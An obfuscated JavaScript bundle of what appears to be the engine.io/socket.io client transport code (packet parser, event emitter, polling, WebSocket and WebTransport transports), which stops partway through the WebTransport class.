/* Probably all socket.io */
const a5_0x4bd327 = function () {
  let _0x3ff679 = true;
  return function (_0x16ae3e, _0x128110) {
    const _0x20e3f5 = _0x3ff679 ? function () {
      if (_0x128110) {
        const _0x1934f9 = _0x128110.apply(_0x16ae3e, arguments);
        _0x128110 = null;
        return _0x1934f9;
      }
    } : function () {};
    _0x3ff679 = false;
    return _0x20e3f5;
  };
}();
const a5_0x5992c8 = a5_0x4bd327(this, function () {
  return a5_0x5992c8.toString().search("(((.+)+)+)+$").toString().constructor(a5_0x5992c8).search("(((.+)+)+)+$");
});
a5_0x5992c8();
import { l as a5_0x45d7a3, m as a5_0x2c54e3, p as a5_0x20ad4b, q as a5_0x246fb4, o as a5_0x40093c } from './index-4b020bd6.js';
import { m as a5_0xc1cacb } from './7357514cKXMp5.js';
import { r as a5_0x3a1055 } from './09bf01f8KXMp5.js';
const v = Object.create(null);
v.open = '0';
v.close = '1';
v.ping = '2';
v.pong = '3';
v.message = '4';
v.upgrade = '5';
v.noop = '6';
const I = Object.create(null);
Object.keys(v).forEach(_0x44bfb6 => {
  I[v[_0x44bfb6]] = _0x44bfb6;
});
const W = {
  'type': 'error',
  'data': "parser error"
};
const Ae = typeof Blob == 'function' || typeof Blob < 'u' && Object.prototype.toString.call(Blob) === "[object BlobConstructor]";
const Te = typeof ArrayBuffer == "function";
const ee = ({
  type: _0x4888ea,
  data: _0x16368c
}, _0x5f2b67, _0x5b3510) => Ae && _0x16368c instanceof Blob ? _0x5f2b67 ? _0x5b3510(_0x16368c) : he(_0x16368c, _0x5b3510) : Te && (_0x16368c instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x16368c) : _0x16368c && _0x16368c.buffer instanceof ArrayBuffer)) ? _0x5f2b67 ? _0x5b3510(_0x16368c) : he(new Blob([_0x16368c]), _0x5b3510) : _0x5b3510(v[_0x4888ea] + (_0x16368c || ''));
const he = (_0x409f1a, _0x27e5f7) => {
  const _0x4a94d8 = new FileReader();
  _0x4a94d8.onload = function () {
    const _0x542f07 = _0x4a94d8.result.split(',')[0x1];
    _0x27e5f7('b' + (_0x542f07 || ''));
  };
  return _0x4a94d8.readAsDataURL(_0x409f1a);
};
function le(_0x419a4f) {
  return _0x419a4f instanceof Uint8Array ? _0x419a4f : _0x419a4f instanceof ArrayBuffer ? new Uint8Array(_0x419a4f) : new Uint8Array(_0x419a4f.buffer, _0x419a4f.byteOffset, _0x419a4f.byteLength);
}
let $;
function He(_0x1020eb, _0x54f481) {
  if (Ae && _0x1020eb.data instanceof Blob) {
    return _0x1020eb.data.arrayBuffer().then(le).then(_0x54f481);
  }
  if (Te && (_0x1020eb.data instanceof ArrayBuffer || (typeof ArrayBuffer.isView == "function" ? ArrayBuffer.isView(_0x1020eb.data) : _0x1020eb.data && _0x1020eb.data.buffer instanceof ArrayBuffer))) {
    return _0x54f481(_0x1020eb.data instanceof Uint8Array ? _0x1020eb.data : _0x1020eb.data instanceof ArrayBuffer ? new Uint8Array(_0x1020eb.data) : new Uint8Array(_0x1020eb.data.buffer, _0x1020eb.data.byteOffset, _0x1020eb.data.byteLength));
  }
  ee(_0x1020eb, false, _0x488c1e => {
    if (!$) {
      $ = new TextEncoder();
    }
    _0x54f481($.encode(_0x488c1e));
  });
}
const x = typeof Uint8Array > 'u' ? [] : new Uint8Array(0x100);
for (let s = 0x0; s < "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".length; s++) {
  x["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charCodeAt(s)] = s;
}
const Je = _0x3be05a => {
  let _0xe0e495 = _0x3be05a.length * 0.75;
  let _0x106697 = _0x3be05a.length;
  let _0x431e0d;
  let _0x3652d2 = 0x0;
  let _0x4d7c5d;
  let _0x259f1e;
  let _0x2bde28;
  let _0x21f46e;
  if (_0x3be05a[_0x3be05a.length - 0x1] === '=') {
    _0xe0e495--;
    if (_0x3be05a[_0x3be05a.length - 0x2] === '=') {
      _0xe0e495--;
    }
  }
  const _0x21bdf9 = new ArrayBuffer(_0xe0e495);
  const _0x262b5a = new Uint8Array(_0x21bdf9);
  for (_0x431e0d = 0x0; _0x431e0d < _0x106697; _0x431e0d += 0x4) {
    _0x4d7c5d = x[_0x3be05a.charCodeAt(_0x431e0d)];
    _0x259f1e = x[_0x3be05a.charCodeAt(_0x431e0d + 0x1)];
    _0x2bde28 = x[_0x3be05a.charCodeAt(_0x431e0d + 0x2)];
    _0x21f46e = x[_0x3be05a.charCodeAt(_0x431e0d + 0x3)];
    _0x262b5a[_0x3652d2++] = _0x4d7c5d << 0x2 | _0x259f1e >> 0x4;
    _0x262b5a[_0x3652d2++] = (_0x259f1e & 0xf) << 0x4 | _0x2bde28 >> 0x2;
    _0x262b5a[_0x3652d2++] = (_0x2bde28 & 0x3) << 0x6 | _0x21f46e & 0x3f;
  }
  return _0x21bdf9;
};
const We = typeof ArrayBuffer == "function";
const te = (_0x5a2f5e, _0x28bba8) => {
  if (typeof _0x5a2f5e != "string") {
    return {
      'type': 'message',
      'data': Ce(_0x5a2f5e, _0x28bba8)
    };
  }
  const _0x336a88 = _0x5a2f5e.charAt(0x0);
  return _0x336a88 === 'b' ? {
    'type': 'message',
    'data': Ke(_0x5a2f5e.substring(0x1), _0x28bba8)
  } : I[_0x336a88] ? _0x5a2f5e.length > 0x1 ? {
    'type': I[_0x336a88],
    'data': _0x5a2f5e.substring(0x1)
  } : {
    'type': I[_0x336a88]
  } : W;
};
const Ke = (_0xe1754f, _0x3729c0) => {
  if (We) {
    const _0x19441 = Je(_0xe1754f);
    return Ce(_0x19441, _0x3729c0);
  } else {
    return {
      'base64': true,
      'data': _0xe1754f
    };
  }
};
const Ce = (_0x4006f7, _0x548ac7) => {
  switch (_0x548ac7) {
    case "blob":
      return _0x4006f7 instanceof Blob ? _0x4006f7 : new Blob([_0x4006f7]);
    case "arraybuffer":
    default:
      return _0x4006f7 instanceof ArrayBuffer ? _0x4006f7 : _0x4006f7.buffer;
  }
};
const Be = String.fromCharCode(0x1e);
const ze = (_0xb6d71b, _0x3e8b58) => {
  const _0x11af3f = _0xb6d71b.length;
  const _0x1cb332 = new Array(_0x11af3f);
  let _0x1c2a0c = 0x0;
  _0xb6d71b.forEach((_0x4139ea, _0x28edec) => {
    ee(_0x4139ea, false, _0x38f0ab => {
      _0x1cb332[_0x28edec] = _0x38f0ab;
      if (++_0x1c2a0c === _0x11af3f) {
        _0x3e8b58(_0x1cb332.join(Be));
      }
    });
  });
};
const Ye = (_0x21e3c3, _0x4ad4be) => {
  const _0x46198c = _0x21e3c3.split(Be);
  const _0x563577 = [];
  for (let _0x56387c = 0x0; _0x56387c < _0x46198c.length; _0x56387c++) {
    const _0x4c5fa5 = te(_0x46198c[_0x56387c], _0x4ad4be);
    _0x563577.push(_0x4c5fa5);
    if (_0x4c5fa5.type === "error") {
      break;
    }
  }
  return _0x563577;
};
function Xe() {
  return new TransformStream({
    'transform'(_0x845b2f, _0x11ffa5) {
      He(_0x845b2f, _0x4b2393 => {
        const _0x3f0a53 = _0x4b2393.length;
        let _0x2bd2f9;
        if (_0x3f0a53 < 0x7e) {
          _0x2bd2f9 = new Uint8Array(0x1);
          new DataView(_0x2bd2f9.buffer).setUint8(0x0, _0x3f0a53);
        } else {
          if (_0x3f0a53 < 0x10000) {
            _0x2bd2f9 = new Uint8Array(0x3);
            const _0x6116a2 = new DataView(_0x2bd2f9.buffer);
            _0x6116a2.setUint8(0x0, 0x7e);
            _0x6116a2.setUint16(0x1, _0x3f0a53);
          } else {
            _0x2bd2f9 = new Uint8Array(0x9);
            const _0x4f313d = new DataView(_0x2bd2f9.buffer);
            _0x4f313d.setUint8(0x0, 0x7f);
            _0x4f313d.setBigUint64(0x1, BigInt(_0x3f0a53));
          }
        }
        if (_0x845b2f.data && typeof _0x845b2f.data != "string") {
          _0x2bd2f9[0x0] |= 0x80;
        }
        _0x11ffa5.enqueue(_0x2bd2f9);
        _0x11ffa5.enqueue(_0x4b2393);
      });
    }
  });
}
let j;
function L(_0x109a81) {
  return _0x109a81.reduce((_0x2c4ceb, _0x3bd563) => _0x2c4ceb + _0x3bd563.length, 0x0);
}
function D(_0x4b8ec8, _0x316f49) {
  if (_0x4b8ec8[0x0].length === _0x316f49) {
    return _0x4b8ec8.shift();
  }
  const _0x461325 = new Uint8Array(_0x316f49);
  let _0x3732b3 = 0x0;
  for (let _0x4e1de1 = 0x0; _0x4e1de1 < _0x316f49; _0x4e1de1++) {
    _0x461325[_0x4e1de1] = _0x4b8ec8[0x0][_0x3732b3++];
    if (_0x3732b3 === _0x4b8ec8[0x0].length) {
      _0x4b8ec8.shift();
      _0x3732b3 = 0x0;
    }
  }
  if (_0x4b8ec8.length && _0x3732b3 < _0x4b8ec8[0x0].length) {
    _0x4b8ec8[0x0] = _0x4b8ec8[0x0].slice(_0x3732b3);
  }
  return _0x461325;
}
function Qe(_0x18e005, _0x70c655) {
  if (!j) {
    j = new TextDecoder();
  }
  const _0x4e7d53 = [];
  let _0x3f39fa = 0x0;
  let _0x24f6d5 = -0x1;
  let _0x513243 = false;
  return new TransformStream({
    'transform'(_0x4325cc, _0x38d9cf) {
      for (_0x4e7d53.push(_0x4325cc);;) {
        if (_0x3f39fa === 0x0) {
          if (L(_0x4e7d53) < 0x1) {
            break;
          }
          const _0xe93365 = D(_0x4e7d53, 0x1);
          _0x513243 = (_0xe93365[0x0] & 0x80) === 0x80;
          _0x24f6d5 = _0xe93365[0x0] & 0x7f;
          if (_0x24f6d5 < 0x7e) {
            _0x3f39fa = 0x3;
          } else if (_0x24f6d5 === 0x7e) {
            _0x3f39fa = 0x1;
          } else {
            _0x3f39fa = 0x2;
          }
        } else {
          if (_0x3f39fa === 0x1) {
            if (L(_0x4e7d53) < 0x2) {
              break;
            }
            const _0x3e1218 = D(_0x4e7d53, 0x2);
            _0x24f6d5 = new DataView(_0x3e1218.buffer, _0x3e1218.byteOffset, _0x3e1218.length).getUint16(0x0);
            _0x3f39fa = 0x3;
          } else {
            if (_0x3f39fa === 0x2) {
              if (L(_0x4e7d53) < 0x8) {
                break;
              }
              const _0x4283c3 = D(_0x4e7d53, 0x8);
              const _0x350bf6 = new DataView(_0x4283c3.buffer, _0x4283c3.byteOffset, _0x4283c3.length);
              const _0x28c1bb = _0x350bf6.getUint32(0x0);
              if (_0x28c1bb > Math.pow(0x2, 21) - 0x1) {
                _0x38d9cf.enqueue(W);
                break;
              }
              _0x24f6d5 = _0x28c1bb * Math.pow(0x2, 0x20) + _0x350bf6.getUint32(0x4);
              _0x3f39fa = 0x3;
            } else {
              if (L(_0x4e7d53) < _0x24f6d5) {
                break;
              }
              const _0x2f42de = D(_0x4e7d53, _0x24f6d5);
              _0x38d9cf.enqueue(te(_0x513243 ? _0x2f42de : j.decode(_0x2f42de), _0x70c655));
              _0x3f39fa = 0x0;
            }
          }
        }
        if (_0x24f6d5 === 0x0 || _0x24f6d5 > _0x18e005) {
          _0x38d9cf.enqueue(W);
          break;
        }
      }
    }
  });
}
function l(_0x253d73) {
  if (_0x253d73) {
    return Ge(_0x253d73);
  }
}
function Ge(_0x3f3241) {
  for (var _0x2d4add in l.prototype) _0x3f3241[_0x2d4add] = l.prototype[_0x2d4add];
  return _0x3f3241;
}
l.prototype.on = l.prototype.addEventListener = function (_0x45d0c9, _0x1bd3db) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + _0x45d0c9] = this._callbacks['$' + _0x45d0c9] || []).push(_0x1bd3db);
  return this;
};
l.prototype.once = function (_0x546924, _0x59de68) {
  function _0x245e3e() {
    this.off(_0x546924, _0x245e3e);
    _0x59de68.apply(this, arguments);
  }
  _0x245e3e.fn = _0x59de68;
  this.on(_0x546924, _0x245e3e);
  return this;
};
l.prototype.off = l.prototype.removeListener = l.prototype.removeAllListeners = l.prototype.removeEventListener = function (_0x2fc938, _0x4db54d) {
  this._callbacks = this._callbacks || {};
  if (arguments.length == 0x0) {
    this._callbacks = {};
    return this;
  }
  var _0x3c9e58 = this._callbacks['$' + _0x2fc938];
  if (!_0x3c9e58) {
    return this;
  }
  if (arguments.length == 0x1) {
    delete this._callbacks['$' + _0x2fc938];
    return this;
  }
  var _0x223fed;
  for (var _0x27ec91 = 0x0; _0x27ec91 < _0x3c9e58.length; _0x27ec91++) {
    _0x223fed = _0x3c9e58[_0x27ec91];
    if (_0x223fed === _0x4db54d || _0x223fed.fn === _0x4db54d) {
      _0x3c9e58.splice(_0x27ec91, 0x1);
      break;
    }
  }
  if (_0x3c9e58.length === 0x0) {
    delete this._callbacks['$' + _0x2fc938];
  }
  return this;
};
l.prototype.emit = function (_0x4f4a68) {
  this._callbacks = this._callbacks || {};
  var _0x52fa6e = new Array(arguments.length - 0x1);
  var _0x5a4812 = this._callbacks['$' + _0x4f4a68];
  for (var _0x5e7ab0 = 0x1; _0x5e7ab0 < arguments.length; _0x5e7ab0++) {
    _0x52fa6e[_0x5e7ab0 - 0x1] = arguments[_0x5e7ab0];
  }
  if (_0x5a4812) {
    _0x5a4812 = _0x5a4812.slice(0x0);
    var _0x5e7ab0 = 0x0;
    for (var _0x3d72c5 = _0x5a4812.length; _0x5e7ab0 < _0x3d72c5; ++_0x5e7ab0) {
      _0x5a4812[_0x5e7ab0].apply(this, _0x52fa6e);
    }
  }
  return this;
};
l.prototype.emitReserved = l.prototype.emit;
l.prototype.listeners = function (_0x19f12b) {
  this._callbacks = this._callbacks || {};
  return this._callbacks['$' + _0x19f12b] || [];
};
l.prototype.hasListeners = function (_0x1e58b0) {
  return !!this.listeners(_0x1e58b0).length;
};
const g = (() => typeof self < 'u' ? self : typeof window < 'u' ? window : Function("return this")())();
function Ne(_0x217fe9, ..._0x45e323) {
  return _0x45e323.reduce((_0x234ddf, _0x3ab952) => (_0x217fe9.hasOwnProperty(_0x3ab952) && (_0x234ddf[_0x3ab952] = _0x217fe9[_0x3ab952]), _0x234ddf), {});
}
const Ze = g.setTimeout;
const et = g.clearTimeout;
function F(_0x4c81b4, _0x4bc05a) {
  if (_0x4bc05a.useNativeTimers) {
    _0x4c81b4.setTimeoutFn = Ze.bind(g);
    _0x4c81b4.clearTimeoutFn = et.bind(g);
  } else {
    _0x4c81b4.setTimeoutFn = g.setTimeout.bind(g);
    _0x4c81b4.clearTimeoutFn = g.clearTimeout.bind(g);
  }
}
function st(_0x3433e4) {
  return typeof _0x3433e4 == 'string' ? nt(_0x3433e4) : Math.ceil((_0x3433e4.byteLength || _0x3433e4.size) * 1.33);
}
function nt(_0x19e2cd) {
  let _0x5627b9 = 0x0;
  let _0x84dd05 = 0x0;
  let _0x11955c = 0x0;
  for (let _0x3801c8 = _0x19e2cd.length; _0x11955c < _0x3801c8; _0x11955c++) {
    _0x5627b9 = _0x19e2cd.charCodeAt(_0x11955c);
    if (_0x5627b9 < 0x80) {
      _0x84dd05 += 0x1;
    } else if (_0x5627b9 < 0x800) {
      _0x84dd05 += 0x2;
    } else if (_0x5627b9 < 0xd800 || _0x5627b9 >= 0xe000) {
      _0x84dd05 += 0x3;
    } else {
      _0x11955c++;
      _0x84dd05 += 0x4;
    }
  }
  return _0x84dd05;
}
function it(_0x27005a) {
  let _0x9118ae = '';
  for (let _0x5739ea in _0x27005a) if (_0x27005a.hasOwnProperty(_0x5739ea)) {
    if (_0x9118ae.length) {
      _0x9118ae += '&';
    }
    _0x9118ae += encodeURIComponent(_0x5739ea) + '=' + encodeURIComponent(_0x27005a[_0x5739ea]);
  }
  return _0x9118ae;
}
function rt(_0x1bf8e6) {
  let _0x1b8bdc = {};
  let _0x12b560 = _0x1bf8e6.split('&');
  let _0x46d61f = 0x0;
  for (let _0x46a2ab = _0x12b560.length; _0x46d61f < _0x46a2ab; _0x46d61f++) {
    let _0x3fe078 = _0x12b560[_0x46d61f].split('=');
    _0x1b8bdc[decodeURIComponent(_0x3fe078[0x0])] = decodeURIComponent(_0x3fe078[0x1]);
  }
  return _0x1b8bdc;
}
class ot extends Error {
  constructor(_0x5f2e3a, _0x3ae382, _0x5cd96a) {
    super(_0x5f2e3a);
    this.description = _0x3ae382;
    this.context = _0x5cd96a;
    this.type = "TransportError";
  }
}
class se extends l {
  constructor(_0xf8c379) {
    super();
    this.writable = false;
    F(this, _0xf8c379);
    this.opts = _0xf8c379;
    this.query = _0xf8c379.query;
    this.socket = _0xf8c379.socket;
  }
  ["onError"](_0x2b3fb2, _0x5b355b, _0x2f9fce) {
    super.emitReserved("error", new ot(_0x2b3fb2, _0x5b355b, _0x2f9fce));
    return this;
  }
  ["open"]() {
    this.readyState = "opening";
    this.doOpen();
    return this;
  }
  ["close"]() {
    if (this.readyState === 'opening' || this.readyState === "open") {
      this.doClose();
      this.onClose();
    }
    return this;
  }
  ["send"](_0x318288) {
    if (this.readyState === "open") {
      this.write(_0x318288);
    }
  }
  ["onOpen"]() {
    this.readyState = "open";
    this.writable = true;
    super.emitReserved("open");
  }
  ["onData"](_0x32ef2b) {
    const _0x278aa5 = te(_0x32ef2b, this.socket.binaryType);
    this.onPacket(_0x278aa5);
  }
  ["onPacket"](_0x30b14d) {
    super.emitReserved('packet', _0x30b14d);
  }
  ["onClose"](_0x199841) {
    this.readyState = "closed";
    super.emitReserved("close", _0x199841);
  }
  ["pause"](_0x5eeb60) {}
  ["createUri"](_0x1f469d, _0x1320e0 = {}) {
    return _0x1f469d + "://" + this._hostname() + this._port() + this.opts.path + this._query(_0x1320e0);
  }
  ["_hostname"]() {
    const _0x5b8101 = this.opts.hostname;
    return _0x5b8101.indexOf(':') === -0x1 ? _0x5b8101 : '[' + _0x5b8101 + ']';
  }
  ["_port"]() {
    return this.opts.port && (this.opts.secure && Number(this.opts.port !== 0x1bb) || !this.opts.secure && Number(this.opts.port) !== 0x50) ? ':' + this.opts.port : '';
  }
  ["_query"](_0x22dab4) {
    const _0x1ca36f = it(_0x22dab4);
    return _0x1ca36f.length ? '?' + _0x1ca36f : '';
  }
}
const Le = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split('');
const at = {};
let fe = 0x0;
let P = 0x0;
let de;
function pe(_0x696b0) {
  let _0x2f10ac = '';
  do {
    _0x2f10ac = Le[_0x696b0 % 0x40] + _0x2f10ac;
    _0x696b0 = Math.floor(_0x696b0 / 0x40);
  } while (_0x696b0 > 0x0);
  return _0x2f10ac;
}
function De() {
  const _0x216c4d = pe(+new Date());
  return _0x216c4d !== de ? (fe = 0x0, de = _0x216c4d) : _0x216c4d + '.' + pe(fe++);
}
for (; P < 0x40; P++) {
  at[Le[P]] = P;
}
let Pe = false;
try {
  Pe = typeof XMLHttpRequest < 'u' && "withCredentials" in new XMLHttpRequest();
} catch (a5_0xaa3f85) {}
const ct = Pe;
function qe(_0x34c063) {
  const _0x5b999b = _0x34c063.xdomain;
  try {
    if (typeof XMLHttpRequest < 'u' && (!_0x5b999b || ct)) {
      return new XMLHttpRequest();
    }
  } catch (_0x3c6e9a) {}
  if (!_0x5b999b) {
    try {
      return new g[["Active"].concat('Object').join('X')]("Microsoft.XMLHTTP");
    } catch (_0x314078) {}
  }
}
function ht() {}
const lt = function () {
  return new qe({
    'xdomain': false
  }).responseType != null;
}();
class ut extends se {
  constructor(_0x2682b7) {
    super(_0x2682b7);
    this.polling = false;
    if (typeof location < 'u') {
      const _0x478d1f = location.protocol === "https:";
      let _0x3be2cc = location.port;
      if (!_0x3be2cc) {
        _0x3be2cc = _0x478d1f ? "443" : '80';
      }
      this.xd = typeof location < 'u' && _0x2682b7.hostname !== location.hostname || _0x3be2cc !== _0x2682b7.port;
    }
    const _0x29dccc = _0x2682b7 && _0x2682b7.forceBase64;
    this.supportsBinary = lt && !_0x29dccc;
    if (this.opts.withCredentials) {
      this.cookieJar = undefined;
    }
  }
  get ["name"]() {
    return 'polling';
  }
  ['doOpen']() {
    this.poll();
  }
  ["pause"](_0x1fee8c) {
    this.readyState = "pausing";
    const _0xb94d60 = () => {
      this.readyState = "paused";
      _0x1fee8c();
    };
    if (this.polling || !this.writable) {
      let _0x3cf9d9 = 0x0;
      if (this.polling) {
        _0x3cf9d9++;
        this.once("pollComplete", function () {
          if (! --_0x3cf9d9) {
            _0xb94d60();
          }
        });
      }
      if (!this.writable) {
        _0x3cf9d9++;
        this.once("drain", function () {
          if (! --_0x3cf9d9) {
            _0xb94d60();
          }
        });
      }
    } else {
      _0xb94d60();
    }
  }
  ["poll"]() {
    this.polling = true;
    this.doPoll();
    this.emitReserved("poll");
  }
  ['onData'](_0x41be3f) {
    const _0x4d0c07 = _0x4fc76e => {
      if (this.readyState === "opening" && _0x4fc76e.type === "open") {
        this.onOpen();
      }
      if (_0x4fc76e.type === "close") {
        this.onClose({
          'description': "transport closed by the server"
        });
        return false;
      }
      this.onPacket(_0x4fc76e);
    };
    Ye(_0x41be3f, this.socket.binaryType).forEach(_0x4d0c07);
    if (this.readyState !== "closed") {
      this.polling = false;
      this.emitReserved("pollComplete");
      if (this.readyState === "open") {
        this.poll();
      }
    }
  }
  ['doClose']() {
    const _0x424528 = () => {
      this.write([{
        'type': "close"
      }]);
    };
    if (this.readyState === 'open') {
      _0x424528();
    } else {
      this.once("open", _0x424528);
    }
  }
  ["write"](_0x54438a) {
    this.writable = false;
    ze(_0x54438a, _0x3b0335 => {
      this.doWrite(_0x3b0335, () => {
        this.writable = true;
        this.emitReserved("drain");
      });
    });
  }
  ['uri']() {
    const _0xa81121 = this.opts.secure ? "https" : "http";
    const _0x4098ee = this.query || {};
    if (this.opts.timestampRequests !== false) {
      _0x4098ee[this.opts.timestampParam] = De();
    }
    if (!this.supportsBinary && !_0x4098ee.sid) {
      _0x4098ee.b64 = 0x1;
    }
    return this.createUri(_0xa81121, _0x4098ee);
  }
  ["request"](_0x248ef4 = {}) {
    Object.assign(_0x248ef4, {
      'xd': this.xd,
      'cookieJar': this.cookieJar
    }, this.opts);
    return new w(this.uri(), _0x248ef4);
  }
  ["doWrite"](_0x5a70c3, _0x3a875d) {
    const _0x66889 = this.request({
      'method': "POST",
      'data': _0x5a70c3
    });
    _0x66889.on('success', _0x3a875d);
    _0x66889.on("error", (_0x402788, _0x11636c) => {
      this.onError("xhr post error", _0x402788, _0x11636c);
    });
  }
  ["doPoll"]() {
    const _0x29ec81 = this.request();
    _0x29ec81.on("data", this.onData.bind(this));
    _0x29ec81.on("error", (_0x4c53f3, _0x1192fe) => {
      this.onError("xhr poll error", _0x4c53f3, _0x1192fe);
    });
    this.pollXhr = _0x29ec81;
  }
}
class w extends l {
  constructor(_0x138db8, _0x4ade55) {
    super();
    F(this, _0x4ade55);
    this.opts = _0x4ade55;
    this.method = _0x4ade55.method || "GET";
    this.uri = _0x138db8;
    this.data = _0x4ade55.data !== undefined ? _0x4ade55.data : null;
    this.create();
  }
  ["create"]() {
    var _0xc1920e;
    const _0xca1c97 = Ne(this.opts, "agent", "pfx", "key", "passphrase", "cert", 'ca', 'ciphers', "rejectUnauthorized", "autoUnref");
    _0xca1c97.xdomain = !!this.opts.xd;
    const _0x4f88cd = this.xhr = new qe(_0xca1c97);
    try {
      _0x4f88cd.open(this.method, this.uri, true);
      try {
        if (this.opts.extraHeaders) {
          if (_0x4f88cd.setDisableHeaderCheck) {
            _0x4f88cd.setDisableHeaderCheck(true);
          }
          for (let _0xb8cbf in this.opts.extraHeaders) if (this.opts.extraHeaders.hasOwnProperty(_0xb8cbf)) {
            _0x4f88cd.setRequestHeader(_0xb8cbf, this.opts.extraHeaders[_0xb8cbf]);
          }
        }
      } catch (_0x5eb76d) {}
      if (this.method === "POST") {
        try {
          _0x4f88cd.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
        } catch (_0x14cc96) {}
      }
      try {
        _0x4f88cd.setRequestHeader('Accept', '*/*');
      } catch (_0x1e0581) {}
      if (!((_0xc1920e = this.opts.cookieJar) === null || _0xc1920e === undefined)) {
        _0xc1920e.addCookies(_0x4f88cd);
      }
      if ("withCredentials" in _0x4f88cd) {
        _0x4f88cd.withCredentials = this.opts.withCredentials;
      }
      if (this.opts.requestTimeout) {
        _0x4f88cd.timeout = this.opts.requestTimeout;
      }
      _0x4f88cd.onreadystatechange = () => {
        var _0x527729;
        if (_0x4f88cd.readyState === 0x3) {
          if (!((_0x527729 = this.opts.cookieJar) === null || _0x527729 === undefined)) {
            _0x527729.parseCookies(_0x4f88cd);
          }
        }
        if (_0x4f88cd.readyState === 0x4) {
          if (_0x4f88cd.status === 0xc8 || _0x4f88cd.status === 0x4c7) {
            this.onLoad();
          } else {
            this.setTimeoutFn(() => {
              this.onError(typeof _0x4f88cd.status == 'number' ? _0x4f88cd.status : 0x0);
            }, 0x0);
          }
        }
      };
      _0x4f88cd.send(this.data);
    } catch (_0x5ba404) {
      this.setTimeoutFn(() => {
        this.onError(_0x5ba404);
      }, 0x0);
      return;
    }
    if (typeof document < 'u') {
      this.index = w.requestsCount++;
      w.requests[this.index] = this;
    }
  }
  ["onError"](_0x18709b) {
    this.emitReserved("error", _0x18709b, this.xhr);
    this.cleanup(true);
  }
  ["cleanup"](_0x25b55d) {
    if (!(typeof this.xhr > 'u' || this.xhr === null)) {
      this.xhr.onreadystatechange = ht;
      if (_0x25b55d) {
        try {
          this.xhr.abort();
        } catch (_0x177ef0) {}
      }
      if (typeof document < 'u') {
        delete w.requests[this.index];
      }
      this.xhr = null;
    }
  }
  ['onLoad']() {
    const _0x312798 = this.xhr.responseText;
    if (_0x312798 !== null) {
      this.emitReserved("data", _0x312798);
      this.emitReserved("success");
      this.cleanup();
    }
  }
  ["abort"]() {
    this.cleanup();
  }
}
w.requestsCount = 0x0;
w.requests = {};
if (typeof document < 'u') {
  if (typeof attachEvent == "function") {
    attachEvent("onunload", ge);
  } else {
    if (typeof addEventListener == "function") {
      const s = "onpagehide" in g ? "pagehide" : "unload";
      addEventListener(s, ge, false);
    }
  }
}
function ge() {
  for (let _0x55bbfb in w.requests) if (w.requests.hasOwnProperty(_0x55bbfb)) {
    w.requests[_0x55bbfb].abort();
  }
}
const ne = (() => typeof Promise == 'function' && typeof Promise.resolve == "function" ? _0x5727d7 => Promise.resolve().then(_0x5727d7) : (_0x5d0aa3, _0x40087e) => _0x40087e(_0x5d0aa3, 0x0))();
const q = g.WebSocket || g.MozWebSocket;
const me = typeof navigator < 'u' && typeof navigator.product == 'string' && navigator.product.toLowerCase() === "reactnative";
class dt extends se {
  constructor(_0x4667e8) {
    super(_0x4667e8);
    this.supportsBinary = !_0x4667e8.forceBase64;
  }
  get ["name"]() {
    return 'websocket';
  }
  ["doOpen"]() {
    if (!this.check()) {
      return;
    }
    const _0x5275ea = this.uri();
    const _0x2e58cd = this.opts.protocols;
    const _0x19aa85 = me ? {} : Ne(this.opts, 'agent', "perMessageDeflate", 'pfx', "key", "passphrase", "cert", 'ca', "ciphers", "rejectUnauthorized", "localAddress", "protocolVersion", 'origin', "maxPayload", "family", "checkServerIdentity");
    if (this.opts.extraHeaders) {
      _0x19aa85.headers = this.opts.extraHeaders;
    }
    try {
      this.ws = true && !me ? _0x2e58cd ? new q(_0x5275ea, _0x2e58cd) : new q(_0x5275ea) : new q(_0x5275ea, _0x2e58cd, _0x19aa85);
    } catch (_0x1bc313) {
      return this.emitReserved("error", _0x1bc313);
    }
    this.ws.binaryType = this.socket.binaryType;
    this.addEventListeners();
  }
  ["addEventListeners"]() {
    this.ws.onopen = () => {
      if (this.opts.autoUnref) {
        this.ws._socket.unref();
      }
      this.onOpen();
    };
    this.ws.onclose = _0x1a2a5c => this.onClose({
      'description': "websocket connection closed",
      'context': _0x1a2a5c
    });
    this.ws.onmessage = _0x57df67 => this.onData(_0x57df67.data);
    this.ws.onerror = _0x47a020 => this.onError("websocket error", _0x47a020);
  }
  ['write'](_0x2767c7) {
    this.writable = false;
    for (let _0x3936bf = 0x0; _0x3936bf < _0x2767c7.length; _0x3936bf++) {
      const _0x440c7d = _0x2767c7[_0x3936bf];
      const _0xd769f8 = _0x3936bf === _0x2767c7.length - 0x1;
      ee(_0x440c7d, this.supportsBinary, _0x6b23db => {
        try {
          this.ws.send(_0x6b23db);
        } catch (_0x3aa5e4) {}
        if (_0xd769f8) {
          ne(() => {
            this.writable = true;
            this.emitReserved("drain");
          }, this.setTimeoutFn);
        }
      });
    }
  }
  ["doClose"]() {
    if (typeof this.ws < 'u') {
      this.ws.close();
      this.ws = null;
    }
  }
  ["uri"]() {
    const _0x17baae = this.opts.secure ? "wss" : 'ws';
    const _0x14d025 = this.query || {};
    if (this.opts.timestampRequests) {
      _0x14d025[this.opts.timestampParam] = De();
    }
    if (!this.supportsBinary) {
      _0x14d025.b64 = 0x1;
    }
    return this.createUri(_0x17baae, _0x14d025);
  }
  ["check"]() {
    return !!q;
  }
}
class pt extends se {
  get ['name']() {
    return "webtransport";
  }
  ['doOpen']() {
    if (typeof WebTransport == "function") {
      this.transport = new WebTransport(this.createUri('https'), this.opts.transportOptions[this.name]);
      this.transport.closed.then(() => {
        this.onClose();
      })['catch'](_0x465802 => {
        this.onError("webtransport error", _0x465802);
      });
      this.transport.ready.then(() => {
        this.transport.createBidirectionalStream().then(_0x172a72 => {
          const _0x232b24 = Qe(Number.MAX_SAFE_INTEGER, this.socket.binaryType);
          const _0x4a80df = _0x172a72.readable.pipeThrough(_0x232b24).getReader();
          const _0x248314 = Xe();
          _0x248314.readable.pipeTo(_0x172a72.writable);
          this.writer = _0x248314.writable.getWriter();
          const _0xba90a8 = () => {
            _0x4a80df.read().then(({
              done: _0x2f91f9,
              value: _0x3a9bcd
            }) => {
              if (!_0x2f91f9) {
                this.onPacket(_0x3a9bcd);
                _0xba90a8();
              }
